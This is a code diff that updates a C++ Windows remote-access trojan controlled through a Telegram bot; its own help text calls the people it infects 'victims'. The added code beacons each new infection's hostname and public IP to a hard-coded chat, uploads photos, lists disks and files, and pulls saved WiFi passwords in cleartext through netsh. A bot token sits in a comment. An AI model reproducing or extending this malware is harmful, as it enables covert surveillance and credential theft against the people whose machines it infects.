@@ -10,6 +10,8 @@
 #include <iphlpapi.h>
 #include <ws2tcpip.h>
 #include <iomanip>
+#include <windows.h>
+#include <filesystem>
 #include <opencv2/opencv.hpp> 
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
@@ -17,8 +19,7 @@
 #pragma comment(lib, "Iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Shlwapi.lib")
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
+
 
 using namespace std;
 using json = nlohmann::json;
@@ -27,15 +28,16 @@ using namespace cv;
 string ID;
 const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string CHAT_ID = "-1001655582641";
-const string VERSION = "beta v0.2.5";
+const string VERSION = "beta v0.2.7";
+constexpr int TELEGRAM_MAX = 4096;
 
 
 inline bool filexits(const string& name) {
     struct stat buffer;
     return (stat(name.c_str(), &buffer) == 0);
 }
-string uptime(); string get_exe(); string get_path(); string hostname(); string public_ip(); string admin_rights(); string Cursor_Position();
-const vector <pair<string, string(*)()>> constants = { {"$UPTIME$",uptime},{"$EXE_NAME$",get_exe},{"$HOST_NAME$",hostname},{"$PUBLIC_IP$",public_ip},{"$ADIMN_RIGHTS$",admin_rights},{"$EXE_PATH$",get_path},{"$CURSOR_POSITION$",Cursor_Position}};
+string uptime(); string get_exe(); string hostname(); string public_ip(); string admin_rights(); string Cursor_Position();
+const vector <pair<string, string(*)()>> constants = { {"$UPTIME$",uptime},{"$EXE_NAME$",get_exe},{"$HOST_NAME$",hostname},{"$PUBLIC_IP$",public_ip},{"$ADIMN_RIGHTS$",admin_rights},{"$CURSOR_POSITION$",Cursor_Position}};
 void Send(string);
 
 json bad_json() {
@@ -58,12 +60,12 @@ json GetLastMessage(){
         while (pos != string::npos) {
             string buff = s.substr(0, pos);
             buff += constants[i].second();
-            buff += s.substr(pos + constants[i].first.size(), 4096);
+            buff += s.substr(pos + constants[i].first.size(), TELEGRAM_MAX);
             s = buff;
             pos = s.find(constants[i].first);
         }
     }
-    static bool somethingwentwrong = false;
+    static bool somethingwentwrong(false);
     json j;
     try {
         j = json::parse(s);
@@ -204,6 +206,14 @@ void Send(string to_send) {
     }
 }
 
+void SendPhoto(string path) {
+    //"curl -s -X POST \"https://api.telegram.org/bot" + BOT_API + "/sendPhoto\" -F chat_id=" + CHAT_ID + " -F photo=\"@" + path + "\"";
+    cpr::Response r = cpr::Post(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendPhoto"},
+        cpr::Multipart{ {"chat_id", CHAT_ID},
+                       {"photo", cpr::File{path}} });
+    //cout << r.text;
+}
+
 string exec(const char* cmd) {
     std::array<char, 128> buffer;
     std::string result;
@@ -338,7 +348,19 @@ string admin_rights() {
 string Cursor_Position() {
     POINT p;
     GetCursorPos(&p);
-    return to_string(p.x) + " " + to_string(p.y);
+    return to_string(p.x) + "," + to_string(p.y);
+}
+
+string DiskList() {
+    string s = exec("wmic logicaldisk get caption");
+    string output = "";
+    for (int i = 7; i < s.size(); i++) {
+        if (s[i] >= 65 && s[i] <= 90) {
+            output += s[i];
+            output += ", ";
+        }
+    }
+    return output.substr(0,output.size()-2);
 }
 
 string getStatus() {
@@ -356,10 +378,11 @@ string getStatus() {
     }
     status += "admin_rights: " + admin_rights() + '\n';
     status += "exe_path: " + get_path() + '\n';
-    status += "Current_volume: " + to_string(ChangeVolume()) + '\n';
-    status += "Cursor_Position: " + Cursor_Position(); + '\n';
+    status += "current_volume: " + to_string(ChangeVolume()) + '\n';
+    status += "cursor_position: " + Cursor_Position() + '\n';
+    status += "list_of_disks: " + DiskList() + '\n';
 
-    status += "\n\nversion: " + VERSION + '\n';
+    status += "\nversion: " + VERSION + '\n';
     return status;
 }
 
@@ -385,6 +408,8 @@ void autostart() {
     path = letter[0];
     path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
     if (!filexits(path + "\\" + get_exe())) {
+        Send("New user\nUsername: " + hostname() + "\nip: " + public_ip());
+
         fstream file;
         file.open("o.bat", ios::out);
         file << "TASKKILL /F /IM " << get_exe() << endl
@@ -411,8 +436,10 @@ void autostart() {
         file.open(path + "\\shitoo", ios::in);
         file >> path2;
         file.close();
-        remove(path2.c_str());
-        remove("shitoo");
+        
+        string cmd = "del " + path2;
+        system("del %temp%\\shitoo");
+        system(cmd.c_str());
     }
 }
 
@@ -526,7 +553,10 @@ bool not_error = true;
 void atexit_handler() {
     if(not_error)Send(ID + " error, quiting...");
 }
-
+void Remove(string path) {
+    string s = "del " + path;
+    system(s.c_str());
+}
 void startup() {
     logo();
     fstream file;
@@ -540,7 +570,7 @@ void startup() {
     cout << "ID: " + ID << endl;
 
     string s = get_path() + "update.bat";
-    if (filexits(s))remove(s.c_str());
+    if (filexits(s))Remove(s);
     atexit(atexit_handler);
 }
 
@@ -566,6 +596,10 @@ void help(string parameters) {
         help += "WebcamView\n";
         help += "Sleep <seconds>\n";
         help += "ErrorSound\n";
+        help += "RunningApps\n";
+        help += "ALL_ID (without <id>)\n";
+        help += "ListOfFiles <path>\n";
+        help += "WifiList\n";
 
         help += "Delitself\n";
         help += "Update <link to new version>\n";
@@ -595,6 +629,10 @@ void help(string parameters) {
         else if (parameters == "WebcamView") Send("Sends you webcam, if there's grey square it can means that something is wrong with webcam");
         else if (parameters == "Sleep") Send("makes dupnix sleeping, commands are not working, may be useful e.g for \"Sleep 3600 && cmd shutdown /s\" when you want to shutdown pc in an hour");
         else if (parameters == "ErrorSound") Send("Just makes windows error sound");
+        else if (parameters == "RunningApps")Send("List of running first-plan apps");
+        else if (parameters == "ALL_ID")Send("Every victim will send their id");
+        else if (parameters == "ListOfFiles") Send("Lists all files and folders in given path");
+        else if (parameters == "WifiList") Send("Gives you a list of Wifi names and passwords for them");
         else Send("Wrong command.");
     }
 }
@@ -656,3 +694,60 @@ Mat captureScreenMat(HWND hwnd)
     return src;
 }
 
+bool is_path(const string& path) {
+    struct stat s;
+    if (stat(path.c_str(), &s) == 0){
+        if (s.st_mode & S_IFDIR) return true; 
+        else return false;
+    }
+    else return false;
+}
+
+string ListOfFiles(string path) {
+    string output("");
+    if (!is_path(path))return "Path not exists or it's a file";
+
+    for (const auto& file : std::filesystem::directory_iterator(path)) {
+        output += file.path().generic_string().substr(path.size() + (path[path.size() - 1] == '/' || path[path.size() - 1] == '\\' ? 0 : 1), 256);
+        if (file.is_directory())output += "/";
+        output += '\n';
+    }
+    return output;
+}
+
+string get_ListOfWifiPasswords() {
+    vector<string> wifi;
+
+    string parse(exec("netsh wlan show profile"));
+    int pos = parse.find("All User Profile");
+
+    while(pos!=string::npos){
+        string wifi_name = "";
+        int pos2 = pos;
+        pos = parse.find("All User Profile");
+
+        for (int i = pos2 + 23; i < parse.size(); i++) {
+            if (parse[i] == '\n')break;
+            wifi_name += parse[i];
+        }
+        parse.erase(0, pos + 23);
+        pos = parse.find("All User Profile");
+        wifi.push_back(wifi_name);
+    }
+    string output = "";
+    for (auto& i : wifi) {
+        output += i + " : ";
+        string s = "netsh wlan show profile " + i + " key=clear";
+        s = exec(s.c_str());
+
+        int pos = s.find("Key Content");
+        if (pos != string::npos) {
+            for (int i = pos + 25; i < s.size(); i++) {
+                if (s[i] == '\n')break;
+                output += s[i];
+            }
+        }
+        output += '\n';
+    }
+    return output;
+}
